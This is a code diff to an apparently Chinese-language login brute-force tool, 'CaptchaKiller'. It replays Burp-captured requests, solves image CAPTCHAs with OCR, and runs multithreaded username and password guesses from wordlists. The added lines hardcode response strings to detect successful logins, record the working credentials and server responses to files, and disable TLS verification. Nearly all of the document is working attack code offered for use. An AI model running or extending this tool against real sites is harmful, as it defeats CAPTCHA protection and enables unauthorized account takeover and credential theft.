@@ -30,7 +30,11 @@ print('Please use python version >=3.6') if sys.version_info.major < 3 or sys.ve
 
 
 # import imgcat
-
+showlog = True
+# initialize OCR model
+ocr = ddddocr.DdddOcr(show_ad=False)
+ocr.set_ranges(6)
+print("intialize ocr") 
 
 log = Logging.getLogger(__name__)
 
@@ -58,33 +62,42 @@ class CaptchaKiller:
         self.BLAST_ParseBurpRequest.rmCookie()
         self.REQUEST_HEADER = self.BLAST_ParseBurpRequest.headers
         self.Session = requests.session()
-        self.Session.keep_alive = False
+        self.Session.keep_alive = True
         self.Session.proxies = REQUEST_PROXY
         self.Session.verify = SSL_VERIFY
 
+
     def _stateController(self, r):
         try:
-            for _ in CAPTCHA_ERROR_FLAG:
-                if re.findall(_, r.text):
-                    return -1
-            if r.status_code in CAPTCHA_ERROR_CODE:
-                return -1
-            for _ in LOGIN_ERROR_FLAG:
-                if re.findall(_, r.text):
-                    return 0
-            if r.status_code in LOGIN_ERROR_CODE:
+            # TODO: custom state chcek here
+            # for _ in CAPTCHA_ERROR_FLAG:
+            #     if re.findall(_, r.text):
+            #         return -1
+
+            # # if r.status_code in CAPTCHA_ERROR_CODE:
+            # #     return -1
+            # for _ in LOGIN_ERROR_FLAG:
+            #     if re.findall(_, r.text):
+            #         return 0
+            # # if r.status_code in LOGIN_ERROR_CODE:
+            # #     return 0
+            # for _ in LOGIN_SUCCESS_FLAG:
+            #     if re.findall(_, r.text):
+            #         return 1
+            # # if r.status_code in LOGIN_SUCCESS_CODE:
+            # #     return 1
+            if re.findall("账号密码错误", r.text):
                 return 0
-            for _ in LOGIN_SUCCESS_FLAG:
-                if re.findall(_, r.text):
-                    return 1
-            if r.status_code in LOGIN_SUCCESS_CODE:
+            elif re.findall("验证码输入错误", r.text):
+                return -1
+            else:
                 return 1
         except Exception as e:
             log.error(e)
 
     def _identifyCaptcha(self, imagebytes):
         try:
-            ocr = ddddocr.DdddOcr(show_ad=False)
+            
             res = ocr.classification(imagebytes)
             return re.findall(self.CAPTCHA_REGEX, res)[self.CAPTCHA_REGEX_GETVALUE_INDEX-1]
         except Exception as e:
@@ -93,13 +106,20 @@ class CaptchaKiller:
 
     def _getCaptcha(self):
         try:
+            # print(f'[*] Get captcha... {self.CAPTCHA_ParseBurpRequest.getURL(ssl=self.SSL)}')
             captcha_id = ''
+            # print("request method",self.CAPTCHA_ParseBurpRequest.request_method)
+            # print("url",self.CAPTCHA_ParseBurpRequest.getURL(ssl=self.SSL))
+            # print("header",self.REQUEST_HEADER)
+            # print("proxy", REQUEST_PROXY)
             img = self.Session.request(
                 method=self.CAPTCHA_ParseBurpRequest.request_method,
                 url=self.CAPTCHA_ParseBurpRequest.getURL(ssl=self.SSL),
                 headers=self.REQUEST_HEADER,
-                proxies=REQUEST_PROXY
+                # proxies={"https": "http://127.0.0.1:8080"},
+                verify=False
             )
+            print("captcha request", img.text)
             img_btyes = b''
             if CAPTCHA_DATATYPE.lower() == 'raw':
                 img_btyes = img.content
@@ -107,9 +127,14 @@ class CaptchaKiller:
                 img_btyes = base64.b64decode(img.text)
             elif CAPTCHA_DATATYPE.lower() == 'custom':
                 img_b64 = re.findall(CAPTCHA_CUSTOM_GETFLAG, img.text)[0]
+                img_b64_clean = re.sub(r"^data:image/\w+;base64,", "", img_b64)
+                with open("output_base64.txt", "w") as f:
+                    f.write(img_b64)
                 if CAPTCHA_ID_INDEX:
                     captcha_id = re.findall(CAPTCHA_ID_GETFLAG, img.text)[0]
-                img_btyes = base64.b64decode(img_b64)
+                img_btyes = base64.b64decode(img_b64_clean)
+                with open("output_image.png", "wb") as f:
+                    f.write(img_btyes)
             try:
                 image = Image.open(io.BytesIO(img_btyes))
                 image.verify()
@@ -119,6 +144,7 @@ class CaptchaKiller:
                 return None
             # imgcat.imgcat(img_btyes)
             captcha_result = {'captcha': self._identifyCaptcha(img_btyes), 'captcha_id': captcha_id}
+            
             return captcha_result
         except Exception as e:
             log.error(e)
@@ -204,9 +230,12 @@ class CaptchaKiller:
         Raises:
 
         """
+
         try:
+            # print(f'[*] Try {params} captcha...')
             c = self._getCaptcha()
             if not c.get('captcha'):
+                print(c.get('not get captcha'))
                 log.info(f'Captcha error... Try again...')
                 self.doRequest(params, againflag)
                 return
@@ -223,25 +252,38 @@ class CaptchaKiller:
                 params.insert(CAPTCHA_ID_INDEX, c.get('captcha_id'))
             params = [i.rstrip() for i in params]
             payload = self.payloadGenerator(params)
+            # print(f'[*] payload {payload} ')
+            # print(f'{self.BLAST_ParseBurpRequest.getURL(ssl=self.SSL), self.BLAST_ParseBurpRequest.request_method,}') 
+            # print(f'Header: \n {self.REQUEST_HEADER,}')
             r = self.Session.request(
                 method=self.BLAST_ParseBurpRequest.request_method,
                 url=self.BLAST_ParseBurpRequest.getURL(ssl=self.SSL),
-                params=payload.get('params'),
-                data=payload.get('data'),
+
                 json=payload.get('json'),
                 headers=self.REQUEST_HEADER,
-                proxies=REQUEST_PROXY
+                # proxies={"https": "http://127.0.0.1:8080"},
             )
+
+            
             state = self._stateController(r)
             if state == 1:
                 print(f'[*] FIND {params} captcha: {c}')
                 f = open('BlastWithCaptchaResult.txt', 'a+')
                 f.write(
                     f'[{datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}]\t{params} captcha: {c}\n')
+                
+                f_res = open('BlastWithCaptchaResult_Header.txt', 'a+')
+                f_res.write(
+                    f'[\n{datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}]\t{params} captcha: {c}\n'
+                    )
+                f_res.write(r.text)
+                
             elif state == 0:
-                print(f'Login Failed... {params} captcha: {c}')
+                if showlog:
+                    print(f'Login Failed... {params} captcha: {c}')
             elif state == -1:
-                print(f'Try Again {params} captcha: {c}')
+                if showlog:
+                    print(f'Try Again {params} captcha: {c}')
                 if againflag < TRYAGAIN_TIMES:
                     self.doRequest(_params, againflag+1)
                     return
@@ -279,15 +321,17 @@ def run():
         cart = [d for d in itertools.product(*values)]
         return cart
     # parse captcha requests
-
     cp = ParseBurpRequest(CAPTCHA_REQUEST_FILENAME)
     bp = ParseBurpRequest(BLAST_REQUEST_FILENAME)
+    print(f'[*] Load {cp} and {bp}')
     worddict_list = loadDict()
+    print(f'[*] Load {len(worddict_list)} worddicts')
     word_list = cal_cartesian_coord(worddict_list)
     total = len(word_list)
+    print(f'[*] Total {total} payloads')
     tasklist = []
     t = ThreadPoolExecutor(max_workers=THREAD_POOL_SIZE)
-    this_task_num = 0
+    this_task_num = 1
     for k, v in enumerate(word_list):
         this_task_num += 1
         if this_task_num % ONCETIME_THREAD_POOL_SIZE != 0 or ONCETIME_THREAD_POOL_SIZE == 1:
@@ -314,4 +358,14 @@ if __name__ == '__main__':
                 ||        ||
 '''
     print(logo)
-    run()
+    
+    start_time = datetime.datetime.now()  # 记录开始时间
+    print(f"🚀 开始时间: {start_time.strftime('%Y-%m-%d %H:%M:%S')}")
+
+    run()  # 执行函数
+
+    end_time = datetime.datetime.now()  # 记录结束时间
+    elapsed_time = (end_time - start_time).total_seconds()  # 计算耗时
+
+    print(f"✅ 结束时间: {end_time.strftime('%Y-%m-%d %H:%M:%S')}")
+    print(f"🕒 总耗时: {elapsed_time:.2f} 秒")
